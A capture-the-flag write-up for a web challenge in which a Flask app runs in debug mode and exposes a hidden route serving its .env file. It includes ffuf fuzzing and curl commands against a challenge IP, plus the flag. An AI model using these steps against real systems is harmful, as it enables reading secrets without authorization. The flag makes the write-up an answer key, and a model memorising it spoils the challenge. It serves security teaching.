# Debug Disaster

## 1. Summary

- **Category**: Web
- **Points**: 633
- **Solves**: 365

### Description

> `Developing this application is tough, and I needed debug mode to be enabled... but I'm nervous I forgot to turn it off in production. I also think I may have forgot to remove something from the application structure.`

## 2. Analysis

### Vulnerability

- **Information Exposure via Debug Mode**: The application has Flask's debug mode enabled in a production environment. This exposes sensitive source code and stack traces when an error occurs.
- **Insecure Endpoint Exposure**: A hidden administrative route (`/flg_bar`) exists that serves sensitive configuration files (like `.env`) without any authentication.

## 3. Exploit Flow

1. **Directory Fuzzing**
   Using `ffuf` to discover hidden directories reveals an `/admin` endpoint that returns a 500 Internal Server Error.

   ```sh
   $ ffuf -u http://23.179.17.92:5002/FUZZ -w common.txt
   admin                   [Status: 500, Size: 14304, Words: 2110, Lines: 237, Duration: 204ms]
   ```

2. **Triggering Debug Leak**
   Accessing the `/admin` page triggers a manual exception. Because debug mode is active, the interactive debugger displays the source code of the application, revealing a hidden route:

   ```python
   @app.route("/flg_bar")
   def env():
       return open(".env").read(), 200, {"Content-Type": "text/plain"}
   ```

3. **Sensitive Data Extraction**
   By navigating to the leaked `/flg_bar` endpoint, the contents of the `.env` file are displayed, which contains the flag.

## 4. Final Solution

- **Exploit Payload**:
  `curl http://23.179.17.92:5002/flg_bar`

## 5. Flag

`CIT{H1dd3n_D1r5_3v3rywh3r3}`
